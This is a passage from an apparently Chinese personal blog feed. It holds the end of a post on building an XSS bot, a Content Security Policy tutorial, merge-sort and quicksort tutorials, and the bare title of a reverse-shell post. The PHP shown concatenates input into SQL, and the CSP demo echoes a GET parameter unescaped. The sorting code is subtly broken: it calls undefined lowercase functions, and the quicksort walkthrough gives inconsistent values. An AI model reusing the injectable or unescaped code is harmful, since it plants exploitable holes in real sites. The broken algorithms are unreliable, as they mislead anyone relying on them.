='"</span>.$contentid.<span class="string">"'"</span>;</span><br><span class="line">    $mysqli-&gt;query($query2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>所以我们也可以完成bot部分的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium                                                             </span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver                                              </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException                   </span><br><span class="line"><span class="keyword">import</span> time                                                                 </span><br><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display                                        </span><br><span class="line">                                                                         </span><br><span class="line">url=<span class="string">'http://127.0.0.1/admin666.php'</span>                                                                                     </span><br><span class="line">display = Display(visible=<span class="number">0</span>,size=(<span class="number">800</span>,<span class="number">600</span>))                                 </span><br><span class="line">display.start()                                                             </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:                                                                    </span><br><span class="line">    <span class="keyword">try</span>:                                                                    </span><br><span class="line">        browser = webdriver.Firefox()                                       </span><br><span class="line">        browser.get(url)                                                    </span><br><span class="line">        browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'key'</span>,<span class="string">'value'</span>:<span class="string">'admin123!@#'</span>,<span class="string">'path'</span>:<span class="string">'/'</span>&#125;) </span><br><span class="line">        browser.get(url)                                                    </span><br><span class="line">        time.sleep(<span class="number">1</span>)                                                       </span><br><span class="line">        browser.quit()                                                      </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:                                                  </span><br><span class="line">        <span class="keyword">print</span> (e)                                                           </span><br><span class="line">        <span class="keyword">continue</span>                                                            </span><br></pre></td></tr></table></figure><br>如此我们便实现了一个简单的留言型xss demo，虽然需要后端支持，但相对来说较为安全。希望能有更好的方法来实现。<br>代码已上传至GitHub：<br><a href="https://github.com/zer0e/xssbot_1/" target="_blank" rel="noopener">https://github.com/zer0e/xssbot_1/</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>学长的文章—&gt;&gt;<a href="http://www.freebuf.com/articles/web/133456.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/133456.html</a><br><a href="https://www.bubbles966.cn/blog/2017/10/29/xssbot-with-firefox/" target="_blank" rel="noopener">https://www.bubbles966.cn/blog/2017/10/29/xssbot-with-firefox/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前一阵子开始研究了一下xssbot，在网上找了许多文章，但这些文章重点都放在bot代码部分，对其完整网站的实现并不是说的挺清楚，这篇文章总结
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈CSP内容安全策略</title>
    <link href="http://zcluslloye.cn/2018/07/12/csp/"/>
    <id>http://zcluslloye.cn/2018/07/12/csp/</id>
    <published>2018-07-12T14:20:28.000Z</published>
    <updated>2018-11-14T09:33:59.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSP策略全称为Content Security Policy，是以白名单的机制对网站加载或者执行的资源起作用。CSP通常以HTTP头信息或者meta元素定义，可以较好的防御dom xss。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>1.使用meta标签，直接在页面中定义csp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-security-policy"</span> <span class="attr">content</span>=<span class="string">"策略"</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这种方式较为简单，但需要每个页面都添加，较为繁琐。</p><p>2.使用HTTP头定义CSP<br>Apache :</p><p>Add the following to your httpd.conf in your VirtualHost or in an .htaccess file:</p><p>Header set Content-Security-Policy “default-src ‘self’;”</p><p>Nginx :</p><p>In your server {} block add:</p><p>add_header Content-Security-Policy “default-src ‘self’;”</p><p>也可使用PHP设置http头:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'"</span>);</span><br></pre></td></tr></table></figure></p><h1 id="CSP的书写规则"><a href="#CSP的书写规则" class="headerlink" title="CSP的书写规则"></a>CSP的书写规则</h1><p>举个例子<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//限制所有外部资源，所有资源只能从当前域名加载</span><br><span class="line">Content-Security-Policy: default-src 'self'</span><br><span class="line">//也可以指定资源网站</span><br><span class="line">Content-Security-Policy: default-src http://xxx.com</span><br></pre></td></tr></table></figure><br>default-src是CSP指令，多个指令用分号分隔，指令值用空格分隔，如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src http://xxx.com; script-src http://aaa.com http://bbb.com</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//通过report-uri指令发送拦截报告到指定地址</span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;; report-uri /report-uri;</span><br><span class="line">//报告通常为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;csp-report&quot;: &#123;</span><br><span class="line">    &quot;document-uri&quot;: &quot;http://example.com/signup.html&quot;,</span><br><span class="line">    &quot;referrer&quot;: &quot;&quot;,</span><br><span class="line">    &quot;blocked-uri&quot;: &quot;http://example.com/css/style.css&quot;,</span><br><span class="line">    &quot;violated-directive&quot;: &quot;style-src cdn.example.com&quot;,</span><br><span class="line">    &quot;original-policy&quot;: &quot;default-src &apos;none&apos;; style-src cdn.example.com; report-uri /_/csp-reports&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="常用的CSP指令"><a href="#常用的CSP指令" class="headerlink" title="常用的CSP指令"></a>常用的CSP指令</h1><table><thead><tr><th>指令</th><th align="center">指令和指令值示例</th><th align="right">指令说明</th></tr></thead><tbody><tr><td>default-src</td><td align="center">‘self’ cdn.example.com</td><td align="right">默认加载策略</td></tr><tr><td>script-src</td><td align="center">‘self’ js.example.com</td><td align="right">对 JavaScript 的加载策略。</td></tr><tr><td>style-src</td><td align="center">‘self’ css.example.com</td><td align="right">对样式的加载策略。</td></tr><tr><td>img-src</td><td align="center">‘self’ img.example.com</td><td align="right">对图片的加载策略。</td></tr><tr><td>connect-src</td><td align="center">‘self’</td><td align="right">对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。</td></tr><tr><td>font-src</td><td align="center">font.cdn.example.com</td><td align="right">针对 WebFont 的加载策略。</td></tr><tr><td>object-src</td><td align="center">‘self’</td><td align="right">针对 、 或  等标签引入的 flash 等插件的加载策略。</td></tr><tr><td>media-src</td><td align="center">media.cdn.example.com</td><td align="right">针对媒体引入的 HTML 多媒体的加载策略。</td></tr><tr><td>frame-src</td><td align="center">‘self’</td><td align="right">针对 frame 的加载策略。</td></tr><tr><td>report-uri</td><td align="center">/report-uri</td><td align="right">告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。</td></tr><tr><td>sandbox</td><td align="center"></td><td align="right">设置沙盒环境</td></tr><tr><td>child-src</td><td align="center"></td><td align="right">主要防御 <code>&lt;frame&gt;</code>,<code>&lt;iframe&gt;</code></td></tr><tr><td>form-action</td><td align="center"></td><td align="right">主要防御 <code>&lt;form&gt;</code></td></tr><tr><td>frame-ancestors</td><td align="center"></td><td align="right">主要防御 <code>&lt;frame&gt;</code>,<code>&lt;iframe&gt;</code>,<code>&lt;object&gt;</code>,<code>&lt;embed&gt;</code>,<code>&lt;applet&gt;</code></td></tr><tr><td>plugin-types</td><td align="center"></td><td align="right">主要防御 <code>&lt;object&gt;</code>,<code>&lt;embed&gt;</code>,<code>&lt;applet&gt;</code></td></tr></tbody></table><h1 id="CSP指令值"><a href="#CSP指令值" class="headerlink" title="CSP指令值"></a>CSP指令值</h1><table><thead><tr><th>指令值</th><th align="center">指令和指令值示例</th><th align="right">指令值说明</th></tr></thead><tbody><tr><td><em></em></td><td align="center">img-src </td><td align="right">允许任何内容。</td></tr><tr><td>‘none’</td><td align="center">img-src ‘none’</td><td align="right">不允许任何内容。</td></tr><tr><td>‘self’</td><td align="center">img-src ‘self’</td><td align="right">允许来自相同来源的内容（相同的协议、域名和端口）。</td></tr><tr><td>data:</td><td align="center">img-src data:</td><td align="right">允许 data: 协议（如 base64 编码的图片）。</td></tr><tr><td>example.com</td><td align="center">img-src img.example.com</td><td align="right">允许加载指定域名的资源。</td></tr><tr><td><em>.example.com</em></td><td align="center">img-src .example.com</td><td align="right">允许加载 example.com 任何子域的资源。</td></tr><tr><td>‘unsafe-inline’</td><td align="center">script-src ‘unsafe-inline’</td><td align="right">允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。</td></tr><tr><td>‘unsafe-eval’</td><td align="center">script-src ‘unsafe-eval’</td><td align="right">允许加载动态 js 代码，例如 eval()。</td></tr></tbody></table><h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p>定义CSP，图片资源只能从当前域名加载<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: img-src 'self'"</span>);</span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br></pre></td></tr></table></figure><br>输入<code>&lt;img src=1.jpeg &gt;</code>图片成功加载<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/csp/01.png" alt=""><br>输入<code>&lt;img src=&quot;https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/csp/01.png&quot; &gt;</code>图片加载被浏览器阻止，stasus显示为blocked:csp<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/csp/02.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CSP策略虽然通过白名单限制了资源的加载，减少了XSS攻击，但也造成了：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本，并且需要浏览器支持CSP策略。如果使用CSP策略，开发者不得不使内嵌脚本和文档分离，但好在CSP使开发者减少了对XSS攻击的负担。<br>现在大多数浏览器都已支持CSP策略，大大减少了用户被广告骚扰和盗取cookie的风险。</p><h1 id="参见"><a href="#参见" class="headerlink" title="参见"></a>参见</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">Content-Security-Policy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;CSP策略全称为Content Security Policy，是以白名单的机制对网站加载或者执行的资源起作用。CSP通常以HTTP头信息或
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之归并排序</title>
    <link href="http://zcluslloye.cn/2018/06/07/mergesort/"/>
    <id>http://zcluslloye.cn/2018/06/07/mergesort/</id>
    <published>2018-06-07T12:22:00.000Z</published>
    <updated>2018-11-14T09:37:31.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>归并排序是种独立的排序，它通过分治法的思想的排序数组。将数组分治为有序的子序列，最后合并每个子序列，完成排序。<br>归并排序的时间复杂度同快速排序一致，为O(N*logN)，空间复杂度上归并排序则稳定为O(n)来存储临时数组。 </p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>要理解归并排序，需要先理解如何合并两个有序序列。<br>假设有以下有序序列：</p><p><table><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td></tr><tr><td>3</td><td>34</td><td>54</td><td>14</td><td>23</td><td>41</td></tr></table><br>先将序列对半分，分为3，34，54和14，23，41两组有序序列，比较两组序列的第一个数，哪个小就将其放在临时数组中，这里3小于14，便将3放在临时数组中，现在变成了如下序列</p><p><table><tr><td>34</td><td>54</td></tr></table></p><p><table><tr><td>14</td><td>23</td><td>41</td></tr></table><br>接着比较34与14，将14放在临时数组中，以此类推，直到两个序列都放入了临时数组。<br>由此写出代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MemeryArray</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n, <span class="keyword">int</span> b[], <span class="keyword">int</span> m, <span class="keyword">int</span> c[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i, j, k;  </span><br><span class="line">  </span><br><span class="line">    i = j = k = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; m)  <span class="comment">//将小的数放入临时数组</span></span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">if</span> (a[i] &lt; b[j])  </span><br><span class="line">            c[k++] = a[i++];  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            c[k++] = b[j++];   </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n)   <span class="comment">//若两个序列长度不同，则比较完成后直接将有序序列的数依次放入临时数组，下同</span></span><br><span class="line">        c[k++] = a[i++];  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (j &lt; m)  </span><br><span class="line">        c[k++] = b[j++];  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><br>那问题就来了，我们怎么得到两个有序序列来使它们合并呢？<br>我们可以将数组一直二分，直到序列中只有一个数，便可以得到一个数的有序序列。简而言之，先使用递归拆分序列，再合并序列。如此便实现了归并排序。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeArray</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> first,<span class="keyword">int</span> mid,<span class="keyword">int</span> last,<span class="keyword">int</span> temp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = first, j = mid + <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">int</span> m = mid,   n = last;  </span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m &amp;&amp; j &lt;= n)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">if</span> (a[i] &lt;= a[j])  </span><br><span class="line">            temp[k++] = a[i++];  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            temp[k++] = a[j++];  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m)  </span><br><span class="line">        temp[k++] = a[i++];  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n)  </span><br><span class="line">        temp[k++] = a[j++];  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)  </span><br><span class="line">        a[first + i] = temp[i]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> first, <span class="keyword">int</span> last, <span class="keyword">int</span> temp[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (first &lt; last)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> mid = (first + last) / <span class="number">2</span>;  </span><br><span class="line">        mergesort(a, first, mid, temp);  <span class="comment">//递归，使左边序列有序</span></span><br><span class="line">        mergesort(a, mid + <span class="number">1</span>, last, temp); <span class="comment">//使右边序列有序</span></span><br><span class="line">        mergearray(a, first, mid, last, temp); <span class="comment">//合并两个有序序列</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>归并排序效率还是比较高的，但速度上快速排序仍比归并排序来的快。笔者在自己电脑上进行测试：<br>20000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge3.png" alt=""><br>50000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge5.png" alt=""><br>100000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge2.png" alt=""><br>500000个随机数：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/mergesort/merge4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;归并排序是种独立的排序，它通过分治法的思想的排序数组。将数组分治为有序的子序列，最后合并每个子序列，完成排序。&lt;br&gt;归并排序的时间复杂度同
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之快速排序</title>
    <link href="http://zcluslloye.cn/2018/06/02/quicksort/"/>
    <id>http://zcluslloye.cn/2018/06/02/quicksort/</id>
    <published>2018-06-02T11:20:28.000Z</published>
    <updated>2018-06-03T07:03:16.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>快速排序法在众多时间复杂度为N*logN的排序方法中效率极高，因此经常被使用。例如java中的Arrays.sort()还有python中的sort()都是采用优化过后的快速排序法。<br>要直接写出快速排序法并不简单，因此我写了这篇文章来谈谈对快速排序法的理解。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>快速排序是由C. A. R. Hoare在1962年提出的，是对冒泡排序法的一种改进。它的基本思想是：<br>1.从数组中取出一个数作为比较数。(一般为区间第一个数)<br>2.分区。将比这个数大的数放在它的右边，小于等于它的数放在左边。<br>3.再对左右两个分区进行第二步，知道各个分区只有一个数。<br>举个小数组的例子：</p><p><table><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td></tr><tr><td style="color:red;">67</td><td>3</td><td>54</td><td>23</td><td>41</td><td>78</td><td>12</td><td>73</td></tr></table><br>初始时，i=0,j=7,X=a[i]=67<br>由于X等于第一个数，相当于在a[0]上挖了一个坑，可以将其他位置的数填到这里。<br>接着从j开始向前找到一个比X小或相等的数。当j=6时，条件符合。将a[6]的值赋给a[0]。然后i++。这样又在a[6]上挖了一个坑。<br>之后再从i开始找到一个比X大的数，当i=5符合条件，将a[6]=a[5],j- -。<br>此时数组变为：</p><p><table><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td></tr><tr><td style="color:Violet;">12</td><td>3</td><td>54</td><td>23</td><td>41</td><td>78</td><td style="color:red;">78</td><td>73</td></tr></table><br>i=5,j=5,X=72；<br>如果i与j不相等，则重复上面的步骤，先从后往前找，再从前往后找。<br>当i==j时退出。<br>此时可以发现，在a[5]之前的数都小于它，在a[5]之后的数都大于它。之后再对0–4和6–7两个子区间进行上述步骤即可。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>由此我们便可写出挖坑填数的代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AdjustArray</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> <span class="comment">//返回i==j时的数组下标</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i = left, j = right;  </span><br><span class="line">    <span class="keyword">int</span> x = a[left]; <span class="comment">//a[left]即为第一个数  </span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="comment">// 从右向左找小于x的数来填a[i]  </span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; a[j] &gt;= x)   </span><br><span class="line">            j--;    </span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">        &#123;  </span><br><span class="line">            a[i] = a[j]; <span class="comment">//将a[j]填到a[i]中，a[j]就形成了一个新的坑</span></span><br><span class="line">            i++;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 从左向右找大于或等于x的数来填a[j]  </span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; a[i] &lt; x)  </span><br><span class="line">            i++;    </span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">        &#123;  </span><br><span class="line">            a[j] = a[i]; <span class="comment">//将a[i]填到a[j]中，a[i]就形成了一个新的坑  </span></span><br><span class="line">            j--;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//退出时，i等于j。将x填到这个坑中。  </span></span><br><span class="line">    a[i] = x;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> i;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (left &lt; right)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> i = AdjustArray(a, left, right);<span class="comment">//先成挖坑填数法调整a[]  </span></span><br><span class="line">        quick_sort(a, left, i - <span class="number">1</span>); <span class="comment">// 递归调用   </span></span><br><span class="line">        quick_sort(a, i + <span class="number">1</span>, right);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><br>对代码优化之后即可得到简洁的快速排序法：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (left &lt; right)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> i = left, j = right, x = a[left];  </span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; a[j] &gt;= x) <span class="comment">// 从右向左找第一个小于x的数  </span></span><br><span class="line">                j--;    </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">                a[i++] = a[j]; <span class="comment">//也可以不i++，无影响，下面j--同理</span></span><br><span class="line">              </span><br><span class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; a[i] &lt; x) <span class="comment">// 从左向右找第一个大于等于x的数  </span></span><br><span class="line">                i++;    </span><br><span class="line">            <span class="keyword">if</span>(i &lt; j)   </span><br><span class="line">                a[j--] = a[i];  </span><br><span class="line">        &#125;  </span><br><span class="line">        a[i] = x;  </span><br><span class="line">        quick_sort(a, left, i - <span class="number">1</span>); <span class="comment">// 递归调用   </span></span><br><span class="line">        quick_sort(a, i + <span class="number">1</span>, right);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p><p>快速排序法在理解上并不是很难，网上还有许多优化过的版本，这里不再细谈。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;快速排序法在众多时间复杂度为N*logN的排序方法中效率极高，因此经常被使用。例如java中的Arrays.sort()还有python中的
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Linux下反弹shell的几种方式</title>
    <link href="http://zcluslloye.cn/2018/05/28/linux-shell/"/>
    <id>http://zcluslloye.cn/2018/05/28/linux-shell/</id>
    <published>2018-05-28T12:40:34.000Z</published>
    <updated>2018-06-03T07:04:34.761Z</updated>
    
